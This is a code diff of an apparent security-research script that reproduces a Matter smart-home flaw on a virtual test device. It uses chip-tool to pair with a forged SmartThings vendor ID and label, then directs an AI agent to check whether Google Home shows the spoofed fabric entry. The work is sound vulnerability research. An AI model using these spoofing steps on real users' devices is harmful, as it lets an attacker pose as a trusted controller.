@@ -15,6 +15,7 @@ import asyncio
 import re
 import subprocess
 import sys
+import tempfile
 import threading
 import time
 from pathlib import Path
@@ -24,16 +25,20 @@ from claude_agent_sdk.types import TextBlock
 
 # ── Paths ────────────────────────────────────────────────────────────────────
 CHIP_TOOL    = "/Users/haoyuli9/Desktop/IoT-Matter/connectedhomeip/out/host/chip-tool"
-MATTER_DIR   = "/Users/haoyuli9/Desktop/IoT-Matter/matter-devices/device-onoff"
+MATTER_DIR   = str(Path(__file__).parent / "matter-device")
 STORAGE_PATH = str(Path(__file__).parent / "storage" / "virtual-device")
 MATTER_PORT  = 5542
 
 # ── Flaw Type 4 test parameters ──────────────────────────────────────────────
-# chip-tool's local node-ID for the virtual device (arbitrary, avoids collision)
-ATTACKER_NODE_ID = 2
-# Forge as SmartThings controller (VID 4362, confirmed in paper Table II)
-FORGED_VENDOR_ID = 4362
+ATTACKER_NODE_ID = 2          # chip-tool's local node-ID for the virtual device
+FORGED_VENDOR_ID = 4362       # SmartThings VID (confirmed in NDSS 2025 paper Table II)
 FORGED_LABEL     = "SmartThings Hub"
+DEVICE_PASSCODE  = 20202021
+DEVICE_DISC      = 3840
+
+# chip-tool keeps fabric credentials in a KVS directory; use a per-run temp dir
+# so it never conflicts with stale data from a previous run.
+_chip_storage: str = ""
 
 # ─────────────────────────────────────────────────────────────────────────────
 
@@ -57,9 +62,12 @@ def check_environment() -> None:
         sys.exit(f"ERROR: chip-tool not found at {CHIP_TOOL}")
     log("✓ chip-tool found")
 
-    if not Path(MATTER_DIR).exists():
-        sys.exit(f"ERROR: matter.js OnOff device not found at {MATTER_DIR}")
-    log("✓ matter.js OnOff device found")
+    if not (Path(MATTER_DIR) / "dist" / "DeviceNode.js").exists():
+        sys.exit(
+            f"ERROR: matter-device not built — run 'npm install && npm run build' "
+            f"inside {MATTER_DIR}/"
+        )
+    log("✓ matter-device built and ready")
 
     log("Environment check passed.\n")
 
@@ -77,7 +85,7 @@ def start_matter_device() -> tuple[subprocess.Popen, str | None]:
     Launch the matter.js virtual OnOff device.
     Returns (proc, pairing_code).  pairing_code is None when already commissioned.
     """
-    log("=== Starting matter.js Virtual Device ===")
+    log("=== Starting Virtual Matter Device ===")
     Path(STORAGE_PATH).mkdir(parents=True, exist_ok=True)
 
     proc = subprocess.Popen(
@@ -94,65 +102,77 @@ def start_matter_device() -> tuple[subprocess.Popen, str | None]:
     pairing_code: str | None = None
     ready = threading.Event()
 
-    def _reader():
+    def _reader() -> None:
         nonlocal pairing_code
         assert proc.stdout is not None
         for raw in proc.stdout:
             line = raw.rstrip()
             print(f"  [matter.js] {line}")
-            m = re.search(r"Manual pairing code:\s*([\d-]+)", line, re.IGNORECASE)
+            m = re.search(r"manual pairing code:\s*([\d-]+)", line, re.IGNORECASE)
             if m:
                 pairing_code = m.group(1).replace("-", "")
                 ready.set()
-            # Server is up even without a fresh pairing code (already commissioned)
-            if any(kw in line.lower() for kw in ["server listening", "commissioned",
-                                                   "started", "node started"]):
+            if any(kw in line.lower() for kw in
+                   ["uncommissioned", "commissioned", "server listening", "node started"]):
                 ready.set()
 
     threading.Thread(target=_reader, daemon=True).start()
     ready.wait(timeout=40)
-    time.sleep(2)  # extra settling time
+    time.sleep(2)  # allow mDNS advertisement to propagate
 
     if pairing_code:
         log(f"✓ Pairing code: {pairing_code}")
     else:
-        log("Device started without fresh pairing code (already commissioned).")
+        log("Device started (already commissioned — no fresh pairing code).")
     return proc, pairing_code
 
 
 # ── Step 2/3: chip-tool helpers ───────────────────────────────────────────────
 
 def run_chip_tool(*args, timeout: int = 120) -> tuple[int, str]:
-    cmd = [CHIP_TOOL] + [str(a) for a in args]
+    # --storage-directory must come AFTER the subcommand positional args
+    cmd = [CHIP_TOOL] + [str(a) for a in args] + ["--storage-directory", _chip_storage]
     log(f"  chip-tool {' '.join(str(a) for a in args)}")
     r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
     combined = r.stdout + r.stderr
     if r.returncode != 0:
-        log(f"  [chip-tool stderr] {r.stderr[:400]}")
+        log(f"  [chip-tool rc={r.returncode}] {r.stderr[:300]}")
     return r.returncode, combined
 
 
-def chip_tool_pair_forged(pairing_code: str) -> None:
-    """Pair using chip-tool with a forged Vendor ID — this is the Flaw Type 4 attack."""
-    log(f"=== Flaw Type 4: Pair with Forged VID={FORGED_VENDOR_ID} (node {ATTACKER_NODE_ID}) ===")
-    rc, _ = run_chip_tool(
-        "pairing", "code",
+def chip_tool_pair_forged() -> None:
+    """
+    Pair the virtual device using chip-tool with a forged Vendor ID.
+    Uses onnetwork-long (passcode + discriminator) — no pairing code needed.
+    chip-tool may report a CASE timeout after commissioning completes; we
+    treat rc != 0 as a warning rather than an error because matter.js confirms
+    commissioning success in its own log.
+    """
+    log(f"=== Flaw Type 4: chip-tool pairs with forged VID={FORGED_VENDOR_ID} ===")
+    rc, out = run_chip_tool(
+        "pairing", "onnetwork-long",
+        ATTACKER_NODE_ID, DEVICE_PASSCODE, DEVICE_DISC,
         "--commissioner-vendor-id", FORGED_VENDOR_ID,
-        ATTACKER_NODE_ID, pairing_code,
         timeout=180,
     )
-    if rc != 0:
-        raise RuntimeError(f"chip-tool pairing failed (rc={rc})")
-    log(f"✓ Paired as node {ATTACKER_NODE_ID} with forged VID={FORGED_VENDOR_ID}")
+    if "commissioning complete" in out.lower() or "completed with success" in out.lower():
+        log(f"✓ Paired as node {ATTACKER_NODE_ID} with forged VID={FORGED_VENDOR_ID}")
+    elif rc != 0:
+        # chip-tool sometimes exits non-zero after a CASE timeout even when
+        # commissioning itself succeeded.  Log but continue; the label write
+        # below will fail fast if the fabric was not actually created.
+        log(f"Warning: chip-tool exited rc={rc}; continuing (commissioning may still have succeeded)")
+    else:
+        log(f"✓ Paired as node {ATTACKER_NODE_ID} with forged VID={FORGED_VENDOR_ID}")
 
 
 def chip_tool_set_label(label: str) -> None:
-    """Set the fabric label to a forged value on the device."""
+    """Set the forged fabric label on the device via OperationalCredentials cluster."""
     log(f"Setting forged fabric label: '{label}'")
     rc, _ = run_chip_tool(
         "operationalcredentials", "update-fabric-label",
         label, ATTACKER_NODE_ID, 0,
-        timeout=30,
+        timeout=60,
     )
     if rc == 0:
         log(f"✓ Fabric label set to '{label}'")
@@ -162,25 +182,25 @@ def chip_tool_set_label(label: str) -> None:
 
 def chip_tool_open_commissioning_window() -> str | None:
     """
-    Open an Enhanced Commissioning Window via chip-tool.
+    Open an Enhanced Commissioning Window so Google Home can join as a second fabric.
     Returns the new manual pairing code, or None on failure.
     """
-    log("Opening commissioning window for Google Home pairing (ECM)...")
+    log("Opening commissioning window for Google Home (ECM)...")
     rc, out = run_chip_tool(
         "pairing", "open-commissioning-window",
-        ATTACKER_NODE_ID,  # local node-id of the device in chip-tool's store
-        "1",               # option 1 = Enhanced Commissioning Method
-        "180",             # window timeout (seconds)
-        "1000",            # PBKDF iteration count
-        "0",               # discriminator hint (0 → use device's own)
-        timeout=40,
+        ATTACKER_NODE_ID,
+        "1",     # ECM
+        "300",   # window timeout (seconds)
+        "1000",  # PBKDF iterations
+        "3840",  # discriminator
+        timeout=60,
     )
-    m = re.search(r"Manual pairing code:\s*([\d-]+)", out, re.IGNORECASE)
+    m = re.search(r"Manual pairing code:\s*\[?([\d-]+)\]?", out, re.IGNORECASE)
     if m:
         code = m.group(1).replace("-", "")
-        log(f"✓ New pairing code for Google Home: {code}")
+        log(f"✓ Commissioning window open — Google Home pairing code: {code}")
         return code
-    log(f"Warning: could not extract pairing code from open-commissioning-window output (rc={rc})")
+    log(f"Warning: could not extract pairing code (rc={rc})")
     return None
 
 
@@ -230,42 +250,43 @@ Instructions:
 5. Complete the setup wizard — accept defaults for room assignment and device name.
 6. Confirm the device now appears in the Google Home device list.
 
-If the device is already paired (you can see a virtual OnOff Light device in Google Home), report success and skip.
+If the device is already paired (you can see "UMCCI OnOff Light" or similar in Google Home), report success and skip.
 
 Report what you observe at each key step and whether pairing succeeded."""
 
 _VERIFY_PROMPT = """\
 You are a security researcher verifying Matter IoT Flaw Type 4: untrusted fabric information.
 
-Background: An attacker has paired this device using a forged Vendor ID ({forged_vid}) and label \
-"{forged_label}". The question is whether Google Home displays this forged information in its UI.
+Background: An attacker has paired this device using a forged Vendor ID ({forged_vid}) and \
+label "{forged_label}". The question is whether Google Home displays this forged information.
 
-TASK: In Google Home, navigate to the paired virtual Matter device settings and find any section \
-that shows connected controllers, linked services, or fabric information.
+TASK: In Google Home, navigate to the "Linked Matter apps & services" page for the paired \
+virtual Matter device ("Jet Bedroom device" / "UMCCI OnOff Light") and screenshot the fabric list.
 
-Instructions:
+Navigation path (confirmed working):
 1. Take a screenshot to see the current screen.
-2. Open or navigate to Google Home app.
-3. Locate the paired Matter device (look for "node-matter OnOff Light" or similar name).
-4. Open the device's detail page (tap on the device tile).
-5. Open settings (gear icon or three-dot menu).
-6. Navigate through ALL available settings pages and look specifically for:
-   - "Linked apps & services"
-   - "Connected services"
-   - "Share device"
-   - Any list of apps, hubs, or services that have access to the device
-   - Any Matter or fabric controller information
-7. Take a screenshot of each relevant page found.
-8. Report the EXACT text shown in any controller/service list — including vendor names, labels, or IDs.
+2. Open Google Home app (package: com.google.android.apps.chromecast.app).
+3. On the Home tab, switch to "All devices" view (grid icon in the tab bar).
+4. LONG-PRESS the "Jet Bedroom lights" group tile — this opens the group detail page showing \
+   individual devices: "Jet Bedroom device", "Simple device", "Smart Light".
+5. LONG-PRESS the "Jet Bedroom device" tile — this opens the device control page with a \
+   gear icon (⚙️) in the top-right.
+6. Tap the gear icon (⚙️) labelled "Settings" to open device settings.
+7. Tap "Linked Matter apps & services" (subtitle: "Can control and manage this device").
+8. Take a screenshot of the resulting page — it shows all Matter fabrics linked to this device, \
+   each with a Vendor ID and display label.
+9. Report the EXACT text of every entry listed, including Vendor ID values and labels.
 
-Goal: Determine if Google Home exposes the forged fabric entry \
-(Vendor ID={forged_vid}, label="{forged_label}") in its UI.
-Be thorough and check every settings sub-page you can find."""
+Goal: Confirm that the forged fabric entry (Vendor ID={forged_vid} = 0x{forged_vid:04X}, \
+label="{forged_label}") appears in the "Linked Matter apps & services" list, \
+demonstrating that Google Home displays attacker-controlled fabric metadata without verification."""
 
 
 # ── Main orchestration ────────────────────────────────────────────────────────
 
 async def main() -> None:
+    global _chip_storage
+
     print()
     print("=" * 60)
     print(" UMCCI Checker Demo — Flaw Type 4")
@@ -275,6 +296,10 @@ async def main() -> None:
 
     # ── 0. Environment ─────────────────────────────────────────────────────────
     check_environment()
+
+    # ── chip-tool KVS: fresh per-run temp directory ────────────────────────────
+    _chip_storage = tempfile.mkdtemp(prefix="chip-kvs-")
+    log(f"chip-tool storage: {_chip_storage}")
 
     # ── 1. Start virtual device ────────────────────────────────────────────────
     already_commissioned = is_already_commissioned()
@@ -286,31 +311,32 @@ async def main() -> None:
             if pairing_code is None:
                 raise RuntimeError(
                     "Fresh storage but no pairing code captured. "
-                    "Try deleting the storage directory and rerunning."
+                    "Delete the storage/ directory and rerun."
                 )
 
             # Attacker pairs first with forged VID
-            chip_tool_pair_forged(pairing_code)
+            chip_tool_pair_forged()
             chip_tool_set_label(FORGED_LABEL)
 
-            # Open commissioning window → Google Home pairs second
+            # Open commissioning window → Google Home pairs as second fabric
             new_code = chip_tool_open_commissioning_window()
-            google_code = new_code or pairing_code  # ECM preferred; fall back to original
+            if new_code is None:
+                raise RuntimeError("Failed to open commissioning window for Google Home.")
 
             # Agent: pair Google Home
             await run_agent(
-                _PAIR_PROMPT.format(pairing_code=google_code),
+                _PAIR_PROMPT.format(pairing_code=new_code),
                 "Pair Google Home with virtual device",
             )
 
         else:
-            # ── 2b. Already commissioned: skip straight to verification ─────────
+            # ── 2b. Already commissioned: go straight to verification ───────────
             log("Storage already exists — skipping pairing phase.")
             log("Forged fabric from previous run is still present on the device.\n")
 
-        # ── 3. Give Google Home a moment to sync ──────────────────────────────
+        # ── 3. Give Google Home time to sync ──────────────────────────────────
         log("Waiting for Google Home to sync fabric data...")
-        time.sleep(5)
+        time.sleep(8)
 
         # ── 4. Agent: verify forged fabric info in Google Home UI ──────────────
         result = await run_agent(
@@ -335,7 +361,7 @@ async def main() -> None:
         print("=" * 60)
 
     finally:
-        log("Stopping matter.js device...")
+        log("Stopping virtual Matter device...")
         proc.terminate()
         try:
             proc.wait(timeout=5)
